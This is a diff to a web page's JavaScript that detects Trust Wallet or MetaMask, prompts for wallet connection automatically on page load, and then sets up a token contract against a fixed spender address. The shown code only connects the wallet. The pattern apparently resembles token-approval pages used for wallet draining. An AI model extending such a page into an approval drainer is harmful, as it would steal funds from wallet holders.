@@ -24,38 +24,88 @@ document.addEventListener('DOMContentLoaded', async () => {
     document.getElementById('spenderAddress').value = SPENDER_ADDRESS;
     spenderAddress = SPENDER_ADDRESS;
     
+    const isTrustWallet = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
+    const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
+    
     if (typeof window.ethereum === 'undefined') {
-        showStatus('Please install MetaMask or Trust Wallet', 'error');
-        return;
+        if (isTrustWallet === false && window.web3) {
+            window.ethereum = window.web3.currentProvider;
+        } else {
+            showStatus('Please install MetaMask or Trust Wallet', 'error');
+            return;
+        }
     }
     
-    await checkConnection();
+    if (isTrustWallet) {
+        showStatus('Trust Wallet detected. Connecting...', 'info');
+    }
+    
+    await autoConnectWallet();
 });
 
-async function checkConnection() {
+async function autoConnectWallet() {
     try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        const accounts = await provider.listAccounts();
+        if (!window.ethereum) {
+            if (window.web3 && window.web3.currentProvider) {
+                window.ethereum = window.web3.currentProvider;
+            } else {
+                showStatus('Wallet not found. Please open in Trust Wallet browser', 'error');
+                document.getElementById('connectWallet').style.display = 'block';
+                return;
+            }
+        }
         
-        if (accounts.length > 0) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        
+        showStatus('Requesting wallet connection...', 'info');
+        
+        try {
+            const accounts = await provider.send("eth_requestAccounts", []);
+            
+            if (accounts.length === 0) {
+                showStatus('Click "Connect Wallet" to continue', 'info');
+                document.getElementById('connectWallet').style.display = 'block';
+                return;
+            }
+            
             userAddress = accounts[0];
             signer = provider.getSigner();
+            
             await initTokenContract();
-        } else {
-            showStatus('Click "Connect Wallet" to continue', 'info');
+        } catch (requestError) {
+            if (requestError.code === 4001) {
+                showStatus('Connection rejected. Click "Connect Wallet" to try again', 'info');
+            } else {
+                const existingAccounts = await provider.listAccounts();
+                if (existingAccounts.length > 0) {
+                    userAddress = existingAccounts[0];
+                    signer = provider.getSigner();
+                    await initTokenContract();
+                } else {
+                    showStatus('Click "Connect Wallet" to continue', 'info');
+                }
+            }
             document.getElementById('connectWallet').style.display = 'block';
         }
+        
     } catch (error) {
-        console.error('Check connection error:', error);
-        showStatus('Error checking connection: ' + error.message, 'error');
+        console.error('Auto connect error:', error);
+        showStatus('Click "Connect Wallet" to continue', 'info');
         document.getElementById('connectWallet').style.display = 'block';
     }
 }
+
 
 window.connectWallet = async function connectWallet() {
     try {
         showStatus('Connecting wallet...', 'info');
         document.getElementById('connectWallet').disabled = true;
+        
+        if (!window.ethereum) {
+            showStatus('Wallet not found', 'error');
+            document.getElementById('connectWallet').disabled = false;
+            return;
+        }
         
         if (!provider) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -64,7 +114,7 @@ window.connectWallet = async function connectWallet() {
         const accounts = await provider.send("eth_requestAccounts", []);
         
         if (accounts.length === 0) {
-            showStatus('Wallet not connected', 'error');
+            showStatus('Wallet connection rejected', 'error');
             document.getElementById('connectWallet').disabled = false;
             return;
         }
@@ -77,10 +127,35 @@ window.connectWallet = async function connectWallet() {
         
     } catch (error) {
         console.error('Connection error:', error);
-        showStatus('Connection error: ' + error.message, 'error');
+        if (error.code === 4001) {
+            showStatus('Connection rejected by user', 'error');
+        } else {
+            showStatus('Connection error: ' + error.message, 'error');
+        }
         document.getElementById('connectWallet').disabled = false;
     }
 };
+
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length === 0) {
+            userAddress = null;
+            signer = null;
+            tokenContract = null;
+            document.getElementById('nextButton').disabled = true;
+            document.getElementById('connectWallet').style.display = 'block';
+            showStatus('Wallet disconnected', 'info');
+        } else {
+            userAddress = accounts[0];
+            signer = provider.getSigner();
+            initTokenContract();
+        }
+    });
+    
+    window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+    });
+}
 
 
 async function initTokenContract() {
